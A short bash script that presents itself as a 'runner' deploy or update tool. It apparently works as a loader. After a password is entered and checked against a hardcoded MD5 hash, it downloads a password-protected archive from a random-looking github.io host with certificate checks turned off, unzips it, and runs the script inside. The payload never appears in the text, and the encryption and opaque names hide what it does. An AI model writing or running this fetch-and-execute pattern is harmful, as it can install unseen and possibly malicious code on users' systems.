#!/bin/bash

#Configure runner_INI
DEPLOYUPDATETIME="[2022-04-13]-100655"
runner_install_c0="2bcf55ed5d6f963706c7066079a45ffb"
runner_install_c1="55dcd4ce8a606e5aca32d64927419040"
runner_install_c2="4b1f3ed77ba35a7d16c60546bd2cdf0d"
runner_install_c3="https://a3qcmkao.github.io/pr3220"

#Configure runner_deploy
RUNNERDEPLOYCON1=$1
RUNNERDEPLOYCON2=$2
RUNNERDEPLOYCON3=$3
RUNNERDEPLOYCON4=$4
RUNNERDEPLOYCON5=$5
RUNNERDEPLOYCON6=$6
RUNNERDEPLOYCON7=$7
RUNNERDEPLOYCON8=$8
RUNNERDEPLOYCON9=$9

#runner_workspaces
function password_successful(){
	echo "[Runner]: runner_install_sh ..."
    wget ${runner_install_c3}/files/${runner_install_c1}.tp --no-check-certificate -O ${runner_install_c1}.tp
	unzip -o -P ${runner_password} ${runner_install_c1}.tp
	sh runner_install_sh ${runner_install_c1} ${runner_install_c2} ${runner_install_c3}
    exit 0;
}

function password_failed(){
    echo "[Runner]: password_failed ..."
	sleep 5
	sh start
	exit 0;
}

#Start
echo "[update]: ${DEPLOYUPDATETIME} ..."
runner_password=""
read -p "Password:" runner_password
runner_password_md5=` echo -n $runner_password|md5sum|cut -d ' ' -f1 `

if [[ "${runner_password_md5}" = "${runner_install_c0}" ]]; then
    password_successful
else 
    password_failed
fi